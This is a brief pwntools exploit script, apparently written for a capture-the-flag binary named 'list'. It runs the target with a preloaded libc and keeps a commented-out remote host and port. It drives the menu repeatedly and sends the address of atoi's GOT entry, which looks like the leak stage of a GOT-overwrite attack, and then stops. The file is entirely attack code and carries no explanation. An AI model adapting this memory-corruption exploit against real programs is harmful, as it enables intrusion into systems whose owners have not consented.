#!/usr/bin/python

from pwn import *

context.log_level = 'debug'

atoi_got = 0x602040

p = process("./list", env={"LD_PRELOAD":"/home/al3x/libc.so.6"})
#p = remote("106.75.8.58", 13579)

raw_input()
for i in range(0x41):
	p.sendlineafter("5.Exit", '4')

p.sendlineafter("5.Exit", '3')
p.send(p64(atoi_got))

p.sendlineafter("5.Exit", '2')
p.recv()
p.recv()
p.recv()
p.recv()
raw_input()
